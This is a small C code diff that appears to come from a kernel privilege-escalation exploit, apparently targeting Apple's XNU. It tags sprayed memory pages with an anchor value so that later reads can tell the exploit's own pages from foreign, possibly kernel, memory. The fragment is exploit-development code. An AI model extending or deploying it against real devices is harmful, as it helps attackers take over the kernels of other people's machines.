@@ -205,9 +205,16 @@ kern_return_t cs2_pe_v1(void) {
                 return kr;
             }
 
-            // place marker on start of each page
+            /* 2026-11-19: search mapping pages now carry the ANCHOR when armed —
+               the old code used random_marker, making the anchor invisible to
+               every window read. With the anchor on the pages:
+                 window reads anchor = OUR page (known, classifier-excluded)
+                 window reads anything else = FOREIGN (possibly kernel)
+               This is the calib m0 law applied to the cs2 scan. */
+            uint64_t page_tag = cs2_ctx.heap_anchor_armed ?
+                cs2_ctx.heap_anchor : cs2_ctx.random_marker;
             for (uint64_t k = 0; k < search_mapping_size; k += vm_page_size) {
-                memcpy((void*)(search_mapping_address + k), &cs2_ctx.random_marker, sizeof(cs2_ctx.random_marker));
+                memcpy((void*)(search_mapping_address + k), &page_tag, sizeof(page_tag));
             }
 
             // save the address of the mapping onto the search mappings array
